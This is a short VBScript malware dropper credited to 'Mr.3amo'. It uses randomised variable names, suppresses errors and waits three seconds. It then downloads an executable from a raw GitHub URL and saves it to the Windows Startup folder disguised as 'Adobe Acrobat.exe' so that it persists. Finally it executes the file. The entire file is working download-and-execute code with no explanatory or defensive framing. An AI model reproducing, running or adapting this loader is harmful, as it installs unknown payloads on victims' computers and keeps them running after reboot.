'<<< Coded By Mr.3amo>>> 
Set RMyXLARJ = CreateObject("WScript.Shell")
ItdJapGk = RMyXLARJ.SpecialFolders("Startup") & "\Adobe Acrobat.exe"
'<<<<<<<<<<< code start >>>>>>>>>>>
On Error Resume Next
wscript.sleep 3000
call NdfqCwnK("https://raw.githubusercontent.com/noonita323/JPG/refs/heads/main/CDQYUU.exe",ItdJapGk)
sub NdfqCwnK(sitelink,filename)
dim EotXJGzV
Set EotXJGzV = createobject("msxml2.xmlhttp")
dim RiIcjesw
Set RiIcjesw = createobject("Adodb.Stream")
EotXJGzV.Open "GET", sitelink, False
EotXJGzV.Send
with RiIcjesw
.type = 1
.open
.write EotXJGzV.responseBody
.savetofile FileName , 2
 end with
end sub
RMyXLARJ.Exec (ItdJapGk)
